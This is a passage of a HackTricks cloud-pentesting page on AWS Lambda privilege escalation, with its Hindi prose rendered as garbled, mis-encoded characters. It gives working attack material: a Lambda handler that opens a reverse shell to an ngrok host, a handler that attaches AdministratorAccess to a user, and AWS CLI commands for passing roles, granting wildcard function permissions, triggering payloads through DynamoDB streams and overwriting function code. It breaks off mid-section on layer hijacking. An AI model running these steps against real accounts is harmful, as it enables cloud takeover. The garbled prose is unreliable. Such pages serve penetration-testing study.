# AWS - рд▓реИрдореНрдмрдбрд╛ рдкреНрд░рд╛рдЗрд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХреЗрд▓реЗрд╢рди

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рдЕрдирдиреНрдп [**NFTs**](https://opensea.io/collection/the-peass-family)
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## рд▓реИрдореНрдмрдбрд╛

рд▓реИрдореНрдмрдбрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`** рдФрд░ **`lambda:InvokeFunction`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдореМрдЬреВрджрд╛ IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдПрдХ рдирдИ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╛рд╕ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЕрдкрдиреА рдкрд╕рдВрдж рдХреА рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдореЗрдВ AWS рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдб рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдХреЗ рдЕрдкрдиреА рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдУрдВ рдХреЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдХреЛрдб рдлрд┐рд░ AWS API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдХреЗ рдЪрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рдФрд░ рдЯреЛрдХрди рдЪреЛрд░реА** рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
рдЖрдк рд▓реИрдореНрдмрдбрд╛ рдлрдВрдХреНрд╢рди рд╕реЗ рдЦреБрдж рд╣реА рд▓реИрдореНрдмрдбрд╛ рд░реЛрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
рдпрджрд┐ рд▓реИрдореНрдмрдбрд╛ рд░реЛрд▓ рдореЗрдВ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЦреБрдж рдХреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**рдкреЙрдЯреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рд░реЛрд▓ рдХреЛ рд╕реАрдзреЗ рдЙрдиреНрдирдпрди рдХрд░рдирд╛ред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдпрд╣ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ рдХрд┐ **`lambda:InvokeAsync`** рд░реБрдЪрд┐рдХрд░ рд▓рдЧрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрдХреЗрд▓реЗ рдореЗрдВ **`aws lambda invoke-async`** рдХреЛ **рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ**, рдЖрдкрдХреЛ рднреА `lambda:InvokeFunction` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

рдкрд┐рдЫрд▓реЗ рд╕реНрдерд┐рддрд┐ рдХреА рддрд░рд╣, рдЖрдк **`lambda:AddPermission`** рдЕрдиреБрдорддрд┐ рд╣реЛрдиреЗ рдкрд░ рдЕрдкрдиреЗ рдЖрдк рдХреЛ **`lambda:InvokeFunction`** рдЕрдиреБрдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**рдкреЛрдЯреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзреА рдкреНрд░рд╡реЗрд╢рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ред

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, рдФрд░ `lambda:CreateEventSourceMapping`** (рдФрд░ рд╕рдВрднрд╡рддрдГ `dynamodb:PutItem` рдФрд░ `dynamodb:CreateTable`) рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛, рд▓реЗрдХрд┐рди **`lambda:InvokeFunction`** рдЕрдиреБрдорддрд┐ рдХреЗ рдмрд┐рдирд╛, рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИ рджреНрд╡рд╛рд░рд╛ **рдирдП рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдореМрдЬреВрджрд╛ IAM рднреВрдорд┐рдХрд╛ рдХреЛ рдкрд╛рд╕ рдХрд░рдирд╛** рдЬрд┐рд╕рдореЗрдВ рдЙрдирдХреА рдкрд╕рдВрдж рдХреА рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛ рдореЗрдВ AWS рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХрд╛ рдХреЛрдб рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдкрдиреА рдкрд╕рдВрдж рдХреЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдЙрдиреНрд╣реЗрдВ рдлрд┐рд░ рддреЛ **рдПрдХ DynamoDB рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рдиреА рд╣реЛрдЧреА рдпрд╛ рдореМрдЬреВрджрд╛ рддрд╛рд▓рд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**, рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрд╡реЗрдВрдЯ рд╕реНрд░реЛрдд рдореИрдкрд┐рдВрдЧ рдмрдирд╛рдиреА рд╣реЛрдЧреА рдЬреЛ рдЙрд╕ DynamoDB рддрд╛рд▓рд┐рдХрд╛ рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░рддреА рд╣реИред рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдЖрдЗрдЯрдо рдбрд╛рд▓рдирд╛ рд╣реЛрдЧрд╛ рдпрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдХреЛрдИ рдЕрдиреНрдп рд╡рд┐рдзрд┐ рдРрд╕рд╛ рдХрд░реЗрдЧреА рдЬрд┐рд╕рд╕реЗ **рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЖрд╣реНрд╡рд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
рдЬрд╣рд╛рдВ рдкрд╛рдпрдерди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдХреЛрдб** рд▓рдХреНрд╖рд┐рдд рднреВрдорд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдПрдХ рдЙрджрд╛рд╣рд░рдг рдЗрд╕реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдкрд┐рдЫрд▓реА рд╡рд┐рдзрд┐ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдЗрд╕рдХреЗ рдмрд╛рдж, рдЕрдЧрд▓рд╛ рдХрджрдо **рдпрд╣ рдирд┐рд░реНрднрд░ рдХрд░реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ DynamoDB рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ** рдореМрдЬреВрджрд╛ AWS рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВред **рдпрджрд┐** рдЗрд╕реЗ **рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ**, рддреЛ рд╕рдм рдХреБрдЫ рдХрд░рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реЛрдЧреА **рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдШрдЯрдирд╛ рд╕реНрд░реЛрдд рдореИрдкрд┐рдВрдЧ рдмрдирд╛рдиреА рд╣реЛрдЧреА**, рд▓реЗрдХрд┐рди рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рд╣рдореЗрдВ рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдЬрд┐рд╕рдореЗрдВ рд╕реНрдЯреНрд░реАрдорд┐рдВрдЧ рд╕рдХреНрд╖рдо рд╣реЛред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
рдЗрд╕ рдХрдорд╛рдВрдб рдХреЗ рдмрд╛рдж, рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдПрдХ рдЗрд╡реЗрдВрдЯ рд╕реНрд░реЛрдд рдореИрдкрд┐рдВрдЧ рдмрдирд╛рдХрд░ рд▓реИрдореНрдмрдбрд╛ рдлрдВрдХреНрд╢рди рдФрд░ рдбрд╛рдЗрдирд╛рдореЛрдбреАрдмреА рдЯреЗрдмрд▓ рдХреЛ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдЧрд╛:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
рдЕрдм рдЬрдм рд▓реИрдореНрдмрдбрд╛ рдлрдВрдХреНрд╢рди рдФрд░ рд╕реНрдЯреНрд░реАрдо рдХрдиреЗрдХреНрдЯ рд╣реЛ рдЧрдП рд╣реИрдВ, рддреЛ рд╣рдо рдЖрдХреНрд░рдордгрдХрд╛рд░реА **рдбрд╛рдЗрдирд╛рдореЛрдбреАрдмреА рд╕реНрдЯреНрд░реАрдо рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдХреЗ рд▓реИрдореНрдмрдбрд╛ рдлрдВрдХреНрд╢рди рдХреЛ рдЗрдирд╡реЛрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**. рдЗрд╕рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрд╛рдЗрдирд╛рдореЛрдбреАрдмреА рдЯреЗрдмрд▓ рдореЗрдВ рдПрдХ рдЖрдЗрдЯрдо рдбрд╛рд▓рдХрд░ рд╕реНрдЯреНрд░реАрдо рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░, рд▓реИрдореНрдмрдбрд╛ рдлрдВрдХреНрд╢рди рдХреЛ рдЖрд╣реНрд╡рд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдФрд░ рд╣рдорд▓рд╛рд╡рд░ AWS рдЦрд╛рддреЗ рдХреЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдмрдирд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзреА рдЙрдиреНрдирддрд┐ред

### `lambda:AddPermission`

рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рджреЗ рд╕рдХрддрд╛ рд╣реИ (рдпрд╣ рд╕рдВрд╕рд╛рдзрди рдЖрдзрд╛рд░рд┐рдд рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ): 

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЛ рд╕реАрдзреЗ рдЙрдиреНрдирдпрди рдХрд░рдирд╛ред

### `lambda:AddLayerVersionPermission`

рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрддреА рд╡реНрдпрдХреНрддрд┐ рдЦреБрдж рдХреЛ (рдпрд╛ рджреВрд╕рд░реЛрдВ рдХреЛ) `lambda:GetLayerVersion` рдЕрдиреБрдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╡рд╣ рдкрд░рдд рдореЗрдВ рдкрд╣реБрдВрдЪ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдпрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪред

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрддреА рдХреЛ **рдПрдХ рдореМрдЬреВрджрд╛ рд▓реИрдореНрдмрдбрд╛ рдлрдВрдХреНрд╢рди рдореЗрдВ рдХреЛрдб рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ IAM рд░реЛрд▓ рд╕рдВрд▓рдЧреНрди рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж рдЙрдиреНрд╣реЗрдВ рдЗрд╕реЗ рд╕реАрдзреЗ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рд╡реЗ рдЗрд╕реЗ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреА рд╣реЛрдЧреА, рд▓реЗрдХрд┐рди рдпрджрд┐ рдпрд╣ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реИ, рддреЛ рд╕рдВрднрд╛рд╡рдд рд╣реИ рдХрд┐ рдЗрд╕реЗ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рд╣реЛрдЧрд╛ред
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
рдЬрд╣рд╛рдВ рд╕рдВрдмрдВрдзрд┐рдд **.zip рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рд▓реИрдореНрдмрдбрд╛ рдХреА рднреВрдорд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ**ред рдПрдХ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдкрд┐рдЫрд▓реЗ рддрд░реАрдХреЛрдВ рдХреЗ рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд▓реИрдореНрдмрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕реАрдзреА рдкреНрд░рд╡реЗрд╢ред

### `lambda:UpdateFunctionConfiguration`

#### рдкрд░рд┐рдЪрдп

[**рд▓реИрдореНрдмрдбрд╛ рд▓реЗрдпрд░реНрд╕**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) рдЖрдкрдХреЛ рдЕрдкрдиреЗ рд▓реИрдореНрдмрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ **рдХреЛрдб** рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ **рдЕрд▓рдЧ рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ**, рддрд╛рдХрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЛрдб рдЫреЛрдЯрд╛ рд░рд╣ рд╕рдХреЗ рдФрд░ **рдХрдИ рдлрд╝рдВрдХреНрд╢рди рдХреЛрдб рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

рд▓реИрдореНрдмрдбрд╛ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рдХреЗ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдкрд╛рдпрдерди рдХреЛрдб рд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдкрде рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
рдпреЗ рдЬрдЧрд╣реЗрдВ рд╣реИрдВ:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреБрд╕реНрддрдХрд╛рд▓рдп boto3 `/var/runtime/boto3` рд╕реЗ рд▓реЛрдб рд╣реЛрддреА рд╣реИ (4рд╡реАрдВ рд╕реНрдерд┐рддрд┐).

#### рд╢реЛрд╖рдг

**рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдПрдХ рд▓реЗрдпрд░ рд╕рдВрд▓рдЧреНрди рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ `lambda:UpdateFunctionConfiguration` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ **рд▓реЗрдпрд░ рдХреНрд░реЙрд╕-рдЦрд╛рддрд╛ рд╕рд╛рдЭрд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ**ред рд╣рдореЗрдВ рдпрд╣ рднреА рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА **рдХрд┐ рд╡реЗ рдХреМрди рд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ**, рддрд╛рдХрд┐ рд╣рдо рдЙрдиреНрд╣реЗрдВ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░ рд╕рдХреЗрдВ, рд▓реЗрдХрд┐рди рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдо рдмрд╕ **рдорд╛рди рд▓реЗрдВрдЧреЗ рдХрд┐ рд╣рдорд▓реЗ рдХрд┐рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рди рдиреЗ boto3 рдХреЛ рдЖрдпрд╛рдд рдХрд┐рдпрд╛ рд╣реИ**ред

